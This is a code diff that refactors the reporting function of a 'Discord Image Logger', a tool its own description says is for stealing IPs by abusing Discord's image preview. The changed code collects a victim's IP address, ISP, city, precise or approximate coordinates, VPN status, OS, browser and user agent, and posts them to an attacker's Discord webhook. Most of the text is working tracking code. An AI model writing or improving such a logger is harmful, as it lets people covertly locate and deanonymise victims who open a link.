@@ -4,6 +4,7 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+from datetime import datetime
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -87,12 +88,11 @@ def reportError(error):
     ],
 })
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     if ip.startswith(blacklistedIPs):
         return
-    
+
     bot = botCheck(ip, useragent)
-    
     if bot:
         requests.post(config["webhook"], json = {
     "username": config["username"],
@@ -136,47 +136,79 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         if config["antiBot"] == 1:
                 ping = ""
 
-
     os, browser = httpagentparser.simple_detect(useragent)
-    
+
+    # Prepare embed data
+    ip_display = ip if ip else 'Unknown'
+    isp_display = info.get('isp', 'Unknown')
+    asn_display = info.get('as', 'Unknown')
+    country_display = info.get('country', 'Unknown')
+    region_display = info.get('regionName', 'Unknown')
+    city_display = info.get('city', 'Unknown')
+    mobile_display = 'Yes' if info.get('mobile') else 'No'
+    vpn_display = 'Yes' if info.get('proxy') else 'No'
+    bot_status = 'Yes' if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'No'
+
+    # Timezone formatting
+    if info.get('timezone'):
+        tz_parts = info['timezone'].split('/')
+        timezone_display = f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})" if len(tz_parts) > 1 else info['timezone']
+    else:
+        timezone_display = 'Unknown'
+
+    # Coordinates handling
+    if coords:
+        lat, lon = coords.split(',')
+        map_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
+        coords_text = f"[Precise Location]({map_link})"
+    else:
+        lat = info.get('lat')
+        lon = info.get('lon')
+        if lat and lon:
+            map_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
+            coords_text = f"[Approximate Location]({map_link})"
+        else:
+            coords_text = 'Unknown'
+
+    # Create embed fields
+    fields = [
+        {"name": "IP Address", "value": f"`{ip_display}`", "inline": True},
+        {"name": "ISP", "value": f"`{isp_display}`", "inline": True},
+        {"name": "ASN", "value": f"`{asn_display}`", "inline": True},
+        {"name": "Country", "value": f"`{country_display}`", "inline": True},
+        {"name": "Region", "value": f"`{region_display}`", "inline": True},
+        {"name": "City", "value": f"`{city_display}`", "inline": True},
+        {"name": "Coordinates", "value": coords_text, "inline": True},
+        {"name": "Timezone", "value": f"`{timezone_display}`", "inline": True},
+        {"name": "Mobile", "value": f"`{mobile_display}`", "inline": True},
+        {"name": "VPN", "value": f"`{vpn_display}`", "inline": True},
+        {"name": "Bot", "value": f"`{bot_status}`", "inline": True},
+        {"name": "OS", "value": f"`{os}`", "inline": True},
+        {"name": "Browser", "value": f"`{browser}`", "inline": True},
+        {"name": "User Agent", "value": f"```\n{useragent}\n```", "inline": False}
+    ]
+
+    # Build embed
     embed = {
-    "username": config["username"],
-    "content": ping,
-    "embeds": [
-        {
-            "title": "Image Logger - IP Logged",
+        "username": config["username"],
+        "content": ping,
+        "embeds": [{
+            "title": "🕵️ Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
-
-**Endpoint:** `{endpoint}`
-            
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
-
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
-
-**User Agent:**
-```
-{useragent}
-```""",
+            "description": f"**Endpoint:** `{endpoint}`",
+            "fields": fields,
+            "thumbnail": {"url": url} if url else {},
+            "footer": {"text": f"{__app__} {__version__}"},
+            "author": {
+                "name": "DeKrypt",
+                "url": "https://github.com/dekrypted/Discord-Image-Logger",
+                "icon_url": "https://avatars.githubusercontent.com/u/98769965?v=4"
+            },
+            "timestamp": datetime.utcnow().isoformat()
+        }]
     }
-  ],
-}
-    
-    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
+
+    requests.post(config["webhook"], json=embed)
     return info
 
 binaries = {
